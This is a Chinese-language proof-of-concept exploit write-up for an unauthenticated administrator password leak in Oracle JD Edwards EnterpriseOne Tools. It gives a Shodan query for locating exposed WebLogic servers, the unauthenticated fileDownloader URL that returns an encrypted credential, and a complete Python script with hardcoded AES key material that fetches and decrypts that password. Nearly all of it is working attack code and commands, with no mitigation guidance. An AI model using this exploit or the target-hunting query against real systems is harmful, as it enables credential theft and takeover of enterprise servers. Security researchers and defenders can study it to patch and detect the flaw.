# Oracle-JDEdwards-EnterpriseOne未授权获取管理员密码泄漏

Oracle JDEdwards EnterpriseOne Tools未授权获取管理员密码泄漏

## shodan

```yaml
port:8999 product:"Oracle WebLogic Server"
```

## poc

```java
http://ip:8999/manage/fileDownloader?sec=1
```

![image-20240822225543738](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408222255786.png)

```python
import base64
import argparse
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def main():
    # Display ASCII art
    print("""
       ______   ______    ___  ___  ___  ___      ___ ________ ____
      / ___/ | / / __/___|_  |/ _ \|_  |/ _ \____|_  /_  /_  /|_  /
     / /__ | |/ / _//___/ __// // / __// // /___/ __/ / //_ <_/_ < 
     \___/ |___/___/   /____/\___/____/\___/   /____//_/____/____/ 
    """)

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Decrypt a given string.')
    parser.add_argument('--string', help='The string to be decrypted')
    parser.add_argument('--target', help='The target URL to fetch the string from')
    args = parser.parse_args()

    if args.target:
        # Fetch the response from the target URL
        response = fetch_target_string_with_curl(args.target)
        if response:
            input_str = response
            print(f"Fetched string from target: {input_str}")
        else:
            print("No valid string found in the response.")
            return
    elif args.string:
        input_str = args.string
    else:
        print("You must provide either --string or --target.")
        return

    # Decrypt the string
    array_of_bytes = jde_decipher(input_str.encode("UTF-8"))
    print("Decrypted string:", array_of_bytes.decode("UTF-8"))

def fetch_target_string_with_curl(target_url):
    try:
        # Use curl to fetch the target URL with SSL verification disabled
        result = subprocess.run(['curl', '-k', target_url], capture_output=True, text=True)
        if result.returncode == 0:
            response_text = result.stdout.strip()
            print("Response received:")
            print(response_text)  # Print for debugging
            return response_text
        else:
            print(f"curl failed with return code {result.returncode}")
            return None
    except Exception as e:
        print(f"Failed to fetch from target using curl: {e}")
        return None

def jde_decipher(param_array_of_bytes):
    array_of_bytes_1 = show_buffer(param_array_of_bytes)
    array_of_bytes_2 = base64.b64decode(array_of_bytes_1)
    return array_of_bytes_2

def show_buffer(param_array_of_bytes):
    array_of_bytes_1 = bytearray(len(param_array_of_bytes) // 2)
    for j in range(len(array_of_bytes_1)):
        i = 2 * j
        array_of_bytes_1[j] = ((param_array_of_bytes[i] - 65) << 4) + (param_array_of_bytes[i + 1] - 65)

    if array_of_bytes_1[0] != 2:
        raise Exception("Invalid version for net showBuffer")

    array_of_bytes_2 = bytearray(16)
    array_of_bytes_3 = bytearray(16)
    gen_keys(array_of_bytes_2, array_of_bytes_3, array_of_bytes_1[3])

    cipher = AES.new(array_of_bytes_2, AES.MODE_CBC, iv=array_of_bytes_3)
    array_of_bytes_4 = unpad(cipher.decrypt(bytes(array_of_bytes_1[6:])), AES.block_size)

    return array_of_bytes_4

def gen_keys(param_array_of_bytes_1, param_array_of_bytes_2, param_byte):
    array_of_bytes_1 = bytearray([65, 4, 95, 12, 88, 41, 6, 114, 119, 93, 37, 68, 75, 19, 49, 46])
    array_of_bytes_2 = bytearray([107, 34, 26, 94, 68, 41, 119, 48, 3, 88, 28, 97, 5, 127, 77, 54])
    array_of_bytes_3 = bytearray([36, 89, 113, 109, 38, 15, 7, 66, 76, 115, 16, 53, 106, 94, 27, 56])

    j = param_byte >> 4
    k = param_byte & 0xF
    m = array_of_bytes_3[j]
    for i in range(16):
        param_array_of_bytes_1[i] = array_of_bytes_1[i] ^ m

    m = array_of_bytes_3[k]
    for i in range(16):
        param_array_of_bytes_2[i] = array_of_bytes_2[i] ^ m

if __name__ == "__main__":
    main()
```

```
python3 poc.py --string ACHCJKFKHCJKKKJJIBBOCDPIHOEJIICHDGHGJEBABEAG
```

![image-20240822225618589](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408222256627.png)